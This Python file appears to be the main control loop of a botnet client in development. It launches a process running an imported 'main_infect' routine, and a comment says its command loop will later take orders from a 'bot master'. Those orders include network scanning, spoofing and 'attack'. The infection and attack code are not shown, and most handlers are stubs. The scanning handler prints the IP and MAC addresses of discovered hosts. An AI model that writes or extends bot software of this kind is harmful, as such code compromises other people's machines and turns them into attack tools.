import multiprocessing
import time
import enum
from infect import main_infect
from botemp import run


# the protocol
class Types(enum.Enum):
    COMMAND = 1
    COMMAND_RESULT = 2

    NEW_CONNECTION = 3

    KEEP_ALIVE = 4
    KEEP_ALIVE_RESULT = 5


# convert requests to the valid operation
def convert(choice):
    if choice == "scan" or choice.find("scan:") != -1 or choice.find("spoof:") != -1 or choice == "attack":
        return Types.COMMAND
    elif choice == "cmdr":
        return Types.COMMAND_RESULT
    elif choice == "new":
        return Types.NEW_CONNECTION
    elif choice == "keep":
        return Types.KEEP_ALIVE
    elif choice == "keepr":
        return Types.KEEP_ALIVE_RESULT
    return None


# handles all the commands
def handle_command(data):
    if data == "scan":
        parent_conn.send(data)
        clients = parent_conn.recv()
        print("IP" + " " * 15 + "MAC")
        if clients:
            for client in clients:
                print("{}   {}".format(client['ip'], client['mac']))
        else:
            print("scan failed")

    elif data.find("scan:") != -1:
        parent_conn.send(data)
        mac = parent_conn.recv()
        print(mac)


# handles all the command's results
def handle_command_result(data):
    print("do command result")


# handles new connection
def handle_new_connection(data):
    print("do new conn")


# handles keep alive requests
def handle_keep_alive(data):
    print("do keep alive")


# handles keep alive responses
def handle_keep_alive_result(data):
    print("do keep alive result")


if __name__ == '__main__':
    can_infect = False
    # creating a duplex pipe for the IPC
    parent_conn, child_conn = multiprocessing.Pipe()

    # tries to spawn the infection process
    try:
        p1 = multiprocessing.Process(target=main_infect, args=(child_conn, ))
        p1.start()
        can_infect = True
    except Exception as ex:
        print(ex)

    if can_infect:
        print("can_infect")

    # waiting for command (later receives from bot master)
    while True:
        data = input("ins")
        data_type = convert(data)

        if not data_type:
            print("invalid instruction")

        else:
            if data_type == Types.COMMAND:
                handle_command(data)
            elif data_type == Types.COMMAND_RESULT:
                handle_command_result(data)
            elif data_type == Types.NEW_CONNECTION:
                handle_new_connection(data)
            elif data_type == Types.KEEP_ALIVE:
                handle_keep_alive(data)
            else:
                handle_keep_alive_result(data)
        # parent_conn, child_conn = multiprocessing.Pipe()
        # p1 = multiprocessing.Process(target=run, args=(child_conn, ))
        # p1.start()
        # parent_conn.send(choice)
